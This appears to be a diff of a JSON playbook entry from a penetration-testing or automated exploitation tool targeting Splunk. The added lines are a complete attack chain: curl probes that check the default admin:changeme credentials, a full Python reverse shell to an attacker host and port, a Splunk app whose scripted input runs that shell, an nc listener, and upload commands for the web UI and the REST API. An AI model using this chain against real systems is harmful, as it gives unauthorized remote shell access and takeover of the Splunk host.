@@ -12,22 +12,24 @@
         "free license (remote 8089 login disabled) OR usable web creds (default admin:changeme, or no-auth)"
       ],
       "notes": "Free license disables remote login on the 8089 management port but the web app-upload on 8000 still works. A custom app with a scripted input (inputs.conf [script://...]) runs code as the 'splunk' OS user. Default credential is admin:changeme.",
-      "detection_endpoints": [
-        "http://{target}:8000/en-US/account/login",
-        "https://{target}:8089/services/server/info"
+      "validate_commands": [
+        {"cmd": "curl -s -o /dev/null -w '%{http_code}' http://{target}:8000/en-US/account/login --connect-timeout 6", "expect": "200", "required": true, "desc": "Splunk Web UI reachable on 8000"},
+        {"cmd": "curl -s -o /dev/null -w '%{http_code}' -u {user}:{pass} http://{target}:8000/en-US/manager/launcher/apps/local --connect-timeout 6", "expect": "200", "required": true, "desc": "default/supplied creds log in and app management is reachable"},
+        {"cmd": "curl -sk -u {user}:{pass} https://{target}:8089/services/server/info --connect-timeout 6 | grep -i license", "expect": "contains:license", "required": false, "desc": "license mode (free => upload via web 8000 only)"}
       ],
       "validate_steps": [
-        "Browse http://{target}:8000/en-US/manager/launcher/apps/local to confirm app management is reachable.",
-        "Determine license (free vs enterprise) and whether login is required; free + web upload = exploitable.",
-        "Check default credential admin:changeme on the web login (single attempt, approval + scope)."
+        "GET http://{target}:8000/en-US/account/login — 200 means the web UI is reachable.",
+        "GET http://{target}:8000/en-US/manager/launcher/apps/local with creds — 200 means login + app management work.",
+        "GET https://{target}:8089/services/server/info — read licenseState (free => upload via 8000)."
       ],
       "exploit_steps": [
-        "mkdir -p app/bin app/default",
-        "Write app/bin/rev.py: a Python reverse shell to {lhost}:{lport}.",
-        "Write app/default/inputs.conf: [script://./bin/rev.py]\\n disabled=false\\n interval=10\\n sourcetype=shell",
-        "tar -czf app.tar.gz app/",
-        "Upload app.tar.gz via http://{target}:8000/en-US/manager/.../apps/local (Install app from file).",
-        "Start a listener (nc -lvnp {lport}); the scripted input executes as the splunk user within ~interval seconds."
+        "mkdir -p splunk_shell/bin splunk_shell/default",
+        "cat > splunk_shell/bin/rev.py << 'PYEOF'\nimport socket,subprocess,os\ns=socket.socket()\ns.connect((\"{lhost}\",{lport}))\nos.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)\nsubprocess.call([\"/bin/sh\",\"-i\"])\nPYEOF\nchmod +x splunk_shell/bin/rev.py",
+        "cat > splunk_shell/default/inputs.conf << 'CONFEOF'\n[script://./bin/rev.py]\ndisabled = false\ninterval = {interval}\nsourcetype = shell\nCONFEOF",
+        "tar -czvf splunk_shell.tar.gz splunk_shell/",
+        "rlwrap -cAr nc -lvnp {lport}   # listener on your Kali box ({lhost})",
+        "Upload the app — free license: web UI only (http://{target}:8000/en-US/manager/launcher/apps/local → 'Install app from file', or POST to /en-US/manager/appinstall/_upload with a session cookie). Enterprise license: REST also works — curl -k -u {user}:{pass} https://{target}:8089/services/apps/local -d name=splunk_shell --data-urlencode filename=@splunk_shell.tar.gz",
+        "The scripted input runs within ~{interval}s and the shell returns to your listener as the 'splunk' user."
       ],
       "cves": [],
       "refs": [
